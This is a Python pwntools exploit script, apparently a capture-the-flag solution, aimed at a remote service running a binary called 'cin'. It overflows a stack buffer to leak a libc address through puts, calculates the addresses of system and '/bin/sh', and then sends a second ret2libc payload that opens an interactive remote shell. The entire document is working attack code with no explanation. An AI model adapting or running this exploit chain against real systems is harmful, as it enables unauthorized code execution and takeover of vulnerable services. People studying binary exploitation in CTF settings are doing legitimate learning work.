from pwn import *

def exploit():
    #p = process("./cin")
    p = remote("not.codepwnda.id", 30666)
    binary = ELF("cin")
    main = binary.symbols["main"]
    plt_puts = binary.symbols["plt.puts"]
    got_puts = binary.symbols["got.puts"]
    padding = 76

    payload = ""
    payload += "A" * padding
    payload += p32(plt_puts)
    payload += p32(main)
    payload += p32(got_puts)

    p.sendline(payload)

    p.recvuntil("Welcome\n\n")
    libc_leak = u32(p.recv(4))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x05f140 #offset libc remote
    log.info("Libc base : {}".format(hex(libc_base)))
    libc_system = libc_base + 0x03a940 #offset libc remote
    log.info("Libc system : {}".format(hex(libc_system)))
    libc_binsh = libc_base + 0x15902b #offset libc remote
    log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))

    payload = ""
    payload += "A" * padding
    payload += p32(libc_system)
    payload += "JUNK"
    payload += p32(libc_binsh)

    #gdb.attach(p, """
    #            b *vuln+46
    #            c
    #            """)

    p.sendline(payload)
    p.interactive()   

if __name__ == "__main__":
    exploit()
